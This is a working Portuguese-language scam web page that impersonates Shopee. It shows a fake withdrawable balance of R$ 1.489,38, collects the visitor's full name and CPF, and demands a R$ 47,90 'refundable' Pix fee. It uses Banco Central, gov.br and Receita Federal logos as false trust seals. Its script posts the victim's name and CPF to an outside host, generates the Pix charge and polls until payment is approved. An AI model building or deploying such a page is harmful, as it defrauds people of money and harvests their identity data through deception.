<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Resgate Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body {
            font-family: 'Roboto', sans-serif;
            /* Gradiente de fundo sutil como na imagem oficial */
            background: linear-gradient(180deg, #ee4d2d 0%, #f5f5f5 30%);
            margin: 0; padding: 0;
            color: #333;
            min-height: 100vh;
        }

        /* --- UTILIT√ÅRIOS --- */
        .hidden { display: none !important; }
        .red-text { color: #ee4d2d; font-weight: 700; }
        .green-badge { background: #e8f5e9; color: #2e7d32; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; text-transform: uppercase; margin-left: 8px; }
        
        /* BOT√ÉO PADR√ÉO */
        .btn-main {
            background: #ee4d2d; color: white;
            width: 100%; padding: 15px;
            border: none; border-radius: 6px;
            font-size: 16px; font-weight: 700;
            cursor: pointer; text-transform: uppercase;
            box-shadow: 0 4px 6px rgba(238, 77, 45, 0.2);
        }
        .btn-disabled { background: #e0e0e0; color: #999; cursor: not-allowed; box-shadow: none; }

        /* --- TELA 1: SALDO --- */
        .header-section {
            padding: 20px 20px 30px 20px;
            color: white;
        }
        .header-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; }
        
        /* √çcone da Moeda (Novo) */
        .coin-icon {
            width: 42px; height: 42px;
            display: flex; align-items: center; justify-content: center;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
        }
        .coin-icon svg { width: 100%; height: 100%; }
        
        .card-white {
            background: white;
            margin: 0 15px 15px 15px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }

        /* Lista de Benef√≠cios (Novo) */
        .benefits-list { list-style: none; padding: 0; margin: 0; }
        .benefits-list li {
            display: flex; align-items: center; gap: 10px;
            font-size: 13px; color: #555; margin-bottom: 12px;
        }
        .check-icon {
            color: #ee4d2d; font-weight: bold; font-size: 14px;
            background: #fff5f5; width: 20px; height: 20px;
            display: flex; align-items: center; justify-content: center;
            border-radius: 50%; flex-shrink: 0;
        }

        /* Op√ß√µes de Valor */
        .option-group { display: flex; gap: 10px; margin-bottom: 10px; }
        .option-btn {
            border: 1px solid #f0f0f0; background: #f9f9f9;
            padding: 12px 0; border-radius: 6px;
            text-align: center; font-weight: 600; font-size: 14px;
            flex: 1; color: #333; transition: all 0.2s;
        }
        .big-option {
            width: 100%; padding: 20px 0;
            font-size: 24px; font-weight: 800;
            margin: 10px 0 20px 0;
            border: 1px solid #f0f0f0; border-radius: 8px;
            text-align: center; background: #f9f9f9; transition: all 0.2s;
        }
        /* Selecionado */
        .selected { border: 1px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; position: relative; }
        .selected::after {
            content: '‚úî'; position: absolute; top: -6px; right: -6px;
            background: #ee4d2d; color: white; width: 18px; height: 18px;
            border-radius: 50%; font-size: 11px; display: flex; justify-content: center; align-items: center; border: 2px solid #fff;
        }

        /* Selos de Seguran√ßa (Novo) */
        .security-seals-container {
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding-top: 10px;
            filter: grayscale(100%); opacity: 0.7;
        }
        .security-seal {
            height: 30px;
            width: auto;
        }

        /* --- TELA 2: MODAL VINCULAR --- */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6); z-index: 99;
            display: flex; align-items: flex-end; justify-content: center;
        }
        .modal-sheet {
            background: white; width: 100%; max-width: 500px;
            border-radius: 16px 16px 0 0; padding: 30px 25px;
            animation: slideUp 0.3s ease-out;
        }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }

        .input-group { margin-bottom: 20px; }
        .input-label { font-size: 14px; font-weight: 700; color: #333; margin-bottom: 8px; display: block; }
        .input-field {
            width: 100%; padding: 16px;
            border: 1px solid #e0e0e0; border-radius: 8px;
            font-size: 16px; background: #f9f9f9; color: #333;
        }
        .input-field:focus { border-color: #ee4d2d; background: #fff; }

        /* --- TELA 3: CONFIRMA√á√ÉO --- */
        .shopee-top-bar { background: #ee4d2d; padding: 15px 0; display: flex; justify-content: center; }
        .summary-header { background: white; text-align: center; padding: 25px 20px; border-bottom: 10px solid #f5f5f5; }
        .info-card { background: white; margin: 15px; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .info-title { font-size: 13px; font-weight: 700; color: #555; text-transform: uppercase; margin-bottom: 15px; letter-spacing: 0.5px; }
        .data-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
        .data-row:last-child { border-bottom: none; }
        .data-label { color: #777; }
        .data-value { font-weight: 600; text-align: right; color: #333; }
        
        .process-item { display: flex; gap: 15px; margin-bottom: 20px; }
        .p-icon { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; flex-shrink: 0; }
        .p-num { background: #fdeee9; color: #ee4d2d; }
        .p-check { background: #e8f5e9; color: #2e7d32; }
        .p-content h4 { margin: 0 0 5px 0; font-size: 15px; font-weight: 600; color: #333; }
        .p-content p { margin: 0; font-size: 13px; color: #777; }
        
        .footer-logos { display: flex; justify-content: center; gap: 25px; align-items: center; margin: 40px 0 50px 0; filter: grayscale(100%); opacity: 0.5; }
        .logo-img { height: 22px; width: auto; }

        /* Popup QR Code */
        #qr-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; align-items: center; justify-content: center; }
        .qr-box { background: white; width: 90%; max-width: 340px; border-radius: 12px; padding: 30px 25px; text-align: center; }
        .pix-code-area { background: #f0f0f0; border: 1px solid #ddd; padding: 12px; font-size: 12px; word-break: break-all; margin: 20px 0; color: #555; border-radius: 6px; }
    </style>
</head>
<body>

    <div id="step-1">
        <div class="header-section">
            <div class="header-top">
                <span style="font-size: 15px; font-weight: 500; opacity: 0.9;">Seu saldo</span>
                <div class="coin-icon">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="12" r="10" fill="url(#paint0_linear)" stroke="#F59E0B" stroke-width="1.5"/>
                        <path d="M12 6V18M8 12H16" stroke="#FDE68A" stroke-width="2.5" stroke-linecap="round"/>
                        <defs>
                            <linearGradient id="paint0_linear" x1="12" y1="2" x2="12" y2="22" gradientUnits="userSpaceOnUse">
                                <stop stop-color="#FCD34D"/>
                                <stop offset="1" stop-color="#F59E0B"/>
                            </linearGradient>
                        </defs>
                    </svg>
                </div>
            </div>
            <div style="font-size: 42px; font-weight: 800;">R$ <span id="balance-value">0,00</span></div>
            <div style="font-size: 13px; opacity: 0.8; margin-top: 5px;">= <span id="points-value">0,00</span> pontos (s)</div>
        </div>

        <div class="card-white" style="margin-top: -20px; position: relative; z-index: 10;">
            <h3 style="margin-top:0; font-size: 17px; margin-bottom: 20px; color: #222;">Sacar dinheiro</h3>
            
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:20px; font-size:14px; color:#666;">
                <span style="font-size: 18px;">üí≥</span> Transferencia via <strong style="color:#333;">Pix</strong>
            </div>

            <div class="option-group">
                <div class="option-btn" onclick="selectOption(this)">R$1,5</div>
                <div class="option-btn" onclick="selectOption(this)">R$5</div>
                <div class="option-btn" onclick="selectOption(this)">R$10</div>
            </div>

            <div id="big-opt" class="big-option" onclick="selectBigOption()">
                R$ 1.489,38
            </div>

            <button id="btn-sacar-1" class="btn-main btn-disabled" onclick="openStep2()">
                SACAR DINHEIRO
            </button>

            <p style="font-size:12px; color:#999; text-align:center; margin-top:15px; line-height:1.5;">
                Para sacar dinheiro, voc√™ precisa de um saldo m√≠nimo de R$1,5. Os limites de saque podem variar conforme a regi√£o.
            </p>
        </div>

        <div class="card-white">
            <h4 style="margin:0 0 15px 0; font-size:15px; color:#333;">Obtenha seu acesso exclusivo</h4>
            
            <ul class="benefits-list">
                <li><span class="check-icon">‚úì</span> Saques instant√¢neos acima de R$ 1,50</li>
                <li><span class="check-icon">‚úì</span> B√¥nus di√°rios por atividade</li>
                <li><span class="check-icon">‚úì</span> Suporte priorit√°rio 24/7</li>
            </ul>

            <div class="security-seals-container">
                <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" alt="BACEN" class="security-seal">
                <img src="https://www.gov.br/++theme++br.gov.tema/images/logo-govbr.png" alt="gov.br" class="security-seal">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg/1024px-Receita_Federal_do_Brasil_-_2022_logo.svg.png" alt="Receita Federal" class="security-seal" style="height: 25px;">
            </div>
        </div>
    </div>


    <div id="step-2" class="modal-overlay hidden">
        <div class="modal-sheet">
            <h2 style="text-align:center; font-size:18px; margin-bottom:30px; color:#333;">Vincular PIX</h2>
            
            <div class="input-group">
                <label class="input-label">Nome Completo</label>
                <input type="text" id="input-nome" class="input-field" placeholder="Nome do titular da conta">
            </div>

            <div class="input-group">
                <label class="input-label">Tipo de Chave PIX</label>
                <select class="input-field" style="background-color: white; appearance: none;">
                    <option>CPF</option>
                </select>
            </div>

            <div class="input-group">
                <label class="input-label">Chave PIX (CPF)</label>
                <input type="tel" id="input-cpf" class="input-field" placeholder="Digite apenas n√∫meros" maxlength="14" oninput="mask(this)">
            </div>

            <button class="btn-main" onclick="openStep3()" style="padding: 18px;">CONTINUAR</button>
            
            <p style="text-align:center; font-size:12px; color:#bbb; margin-top:25px; display:flex; align-items:center; justify-content:center; gap:5px;">
                üîí Ambiente seguro Shopee Pay
            </p>
        </div>
    </div>


    <div id="step-3" class="hidden" style="background: #f5f5f5; min-height: 100vh;">
        <div class="shopee-top-bar">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" height="30" style="filter: brightness(0) invert(1);">
        </div>

        <div class="summary-header">
            <div style="font-size:13px; font-weight:700; color:#333; text-transform:uppercase; margin-bottom:5px;">SALDO DISPON√çVEL</div>
            <div style="font-size:36px; font-weight:900; color:#000;">R$ 1.489,38</div>
            <div style="font-size:13px; color:#777; margin-top: 5px;">Aguardando confirma√ß√£o para saque</div>
        </div>

        <div class="info-card">
            <div class="info-title">CONFIRMA√á√ÉO DE IDENTIDADE</div>
            <div style="display:flex; align-items:center; margin-bottom:12px;">
                <span style="font-size:24px; font-weight:800; color:#ee4d2d;">R$ 47,90</span>
                <span class="green-badge">VALOR REEMBOLS√ÅVEL</span>
            </div>
            <p style="font-size:14px; color:#555; line-height:1.5; margin:0;">
                Taxa obrigat√≥ria para libera√ß√£o do b√¥nus. O valor de <strong>R$ 47,90</strong> ser√° reembolsado integralmente para voc√™ em 1 minuto ap√≥s a valida√ß√£o.
            </p>
        </div>

        <div class="info-card">
            <div class="info-title">DADOS PARA REEMBOLSO</div>
            <div class="data-row">
                <span class="data-label">Nome</span>
                <span class="data-value" id="display-nome">...</span>
            </div>
            <div class="data-row">
                <span class="data-label">Data</span>
                <span class="data-value" id="display-data">...</span>
            </div>
            <div class="data-row">
                <span class="data-label">Chave PIX</span>
                <span class="data-value" id="display-cpf">...</span>
            </div>
            <div class="data-row">
                <span class="data-label">Valor a receber</span>
                <span class="data-value" style="color:#ee4d2d;">R$ 1.489,38</span>
            </div>
        </div>

        <div class="info-card">
            <div class="info-title" style="margin-bottom: 20px;">PROCESSO DE LIBERA√á√ÉO</div>
            <div class="process-item">
                <div class="p-icon p-num">1</div>
                <div class="p-content">
                    <h4>Pagar taxa de confirma√ß√£o</h4>
                    <p>Para verifica√ß√£o de identidade</p>
                </div>
            </div>
            <div class="process-item">
                <div class="p-icon p-check">‚úì</div>
                <div class="p-content">
                    <h4 style="color:#2e7d32;">Receber reembolso autom√°tico</h4>
                    <p>Valor devolvido em 1 minuto</p>
                </div>
            </div>
            <div class="process-item">
                <div class="p-icon" style="background:#eee; color:#aaa;">3</div>
                <div class="p-content">
                    <h4>Acessar saldo completo</h4>
                    <p>R$ 1.489,38 liberado para saque</p>
                </div>
            </div>
        </div>

        <div style="padding: 15px 20px;">
            <button id="btn-final" class="btn-main" style="padding: 18px;" onclick="gerarPix()">
                Pagar taxa para Liberar Saque
            </button>
            <div style="text-align:center; font-size:13px; color:#2e7d32; font-weight:600; margin-top:15px; display:flex; align-items:center; justify-content:center; gap:5px;">
                ‚è± Reembolso autom√°tico garantido em 1 minuto
            </div>
        </div>

        <div class="footer-logos">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Banco_Central_do_Brasil_logo.svg/2560px-Banco_Central_do_Brasil_logo.svg.png" class="logo-img">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="logo-img" style="height: 25px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="logo-img">
        </div>
    </div>


    <div id="qr-modal">
        <div class="qr-box">
            <h3 style="margin-top:0; color:#333; font-size: 18px;">Pagamento via Pix</h3>
            <p style="font-size:14px; color:#666; margin-bottom: 20px;">Copie o c√≥digo abaixo e pague no aplicativo do seu banco para finalizar.</p>
            
            <img id="img-qr" style="width:180px; height:180px; display:block; margin:0 auto; border:1px solid #eee; padding: 10px; border-radius: 8px;">
            
            <div style="text-align:left; font-size:12px; font-weight:700; margin-bottom:8px; margin-top: 20px; color: #333;">Pix Copia e Cola:</div>
            <textarea id="texto-pix" class="pix-code-area" readonly></textarea>
            
            <button class="btn-main" onclick="copiarCodigo()" style="padding:15px;">COPIAR C√ìDIGO PIX</button>
            
            <div id="msg-sucesso" style="margin-top:20px; display:none; color:#2e7d32; font-weight:bold; font-size: 14px;">
                ‚úÖ PAGAMENTO CONFIRMADO!
            </div>
        </div>
    </div>

    <script>
        // --- FUN√á√ÉO DE ANIMA√á√ÉO DOS N√öMEROS ---
        function animateValue(id, start, end, duration) {
            const obj = document.getElementById(id);
            let startTimestamp = null;
            const step = (timestamp) => {
                if (!startTimestamp) startTimestamp = timestamp;
                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                let value = progress * (end - start) + start;
                
                // Formata√ß√£o para moeda ou pontos
                if (id === 'balance-value') {
                    obj.innerHTML = value.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                } else {
                    obj.innerHTML = value.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                }

                if (progress < 1) {
                    window.requestAnimationFrame(step);
                }
            };
            window.requestAnimationFrame(step);
        }

        // Iniciar anima√ß√£o quando a p√°gina carregar
        document.addEventListener("DOMContentLoaded", () => {
            animateValue("balance-value", 0, 1489.38, 1500); // 1.5 segundos para o saldo
            animateValue("points-value", 0, 42583.05, 1500); // 1.5 segundos para os pontos
        });


        // --- L√ìGICA DO SISTEMA ---
        const API_URL = "https://checkout-pix-profissional.onrender.com";
        let valorSelecionado = false;

        function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }

        function selectOption(el) {
            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
            document.getElementById('big-opt').classList.remove('selected');
            el.classList.add('selected');
            enableBtn1();
        }

        function selectBigOption() {
            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
            document.getElementById('big-opt').classList.add('selected');
            enableBtn1();
        }

        function enableBtn1() {
            const btn = document.getElementById('btn-sacar-1');
            btn.classList.remove('btn-disabled');
            btn.innerText = "SACAR AGORA";
            valorSelecionado = true;
        }

        function openStep2() {
            if(!valorSelecionado) return alert("Selecione um valor para sacar.");
            document.getElementById('step-2').classList.remove('hidden');
        }

        function openStep3() {
            const nome = document.getElementById('input-nome').value;
            const cpf = document.getElementById('input-cpf').value;
            if(nome.length < 3 || cpf.length < 14) return alert("Por favor, preencha seu Nome e CPF corretamente.");

            document.getElementById('display-nome').innerText = nome;
            document.getElementById('display-cpf').innerText = cpf;
            const hoje = new Date();
            document.getElementById('display-data').innerText = hoje.toLocaleDateString('pt-BR');

            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-3').classList.remove('hidden');
            window.scrollTo(0, 0);
        }

        async function gerarPix() {
            const btn = document.getElementById('btn-final');
            const nome = document.getElementById('input-nome').value;
            const cpf = document.getElementById('input-cpf').value.replace(/\D/g,'');

            btn.innerText = "GERANDO PAGAMENTO...";
            btn.classList.add('btn-disabled');

            try {
                const response = await fetch(`${API_URL}/pix`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ amount: 47.90, name: nome, cpf: cpf })
                });
                const data = await response.json();

                if (data.point_of_interaction) {
                    document.getElementById('img-qr').src = `data:image/png;base64,${data.point_of_interaction.transaction_data.qr_code_base64}`;
                    document.getElementById('texto-pix').value = data.point_of_interaction.transaction_data.qr_code;
                    
                    document.getElementById('qr-modal').style.display = 'flex';
                    monitor(data.id);
                } else {
                    throw new Error("Erro na resposta do servidor");
                }
            } catch (error) {
                alert("Erro ao gerar Pix. Verifique sua conex√£o e tente novamente.");
                btn.classList.remove('btn-disabled');
                btn.innerText = "Pagar taxa para Liberar Saque";
            }
        }

        function monitor(id) {
            const interval = setInterval(async () => {
                try {
                    const r = await fetch(`${API_URL}/pix/${id}`);
                    const j = await r.json();
                    if (j.status === 'approved') {
                        clearInterval(interval);
                        document.getElementById('msg-sucesso').style.display = 'block';
                        document.getElementById('img-qr').style.opacity = 0.3;
                    }
                } catch (e) {}
            }, 3000);
        }

        function copiarCodigo() {
            const texto = document.getElementById('texto-pix');
            texto.select();
            texto.setSelectionRange(0, 99999); /* Para mobile */
            document.execCommand('copy');
            alert("C√≥digo Pix copiado com sucesso!");
        }
    </script>
</body>
</html>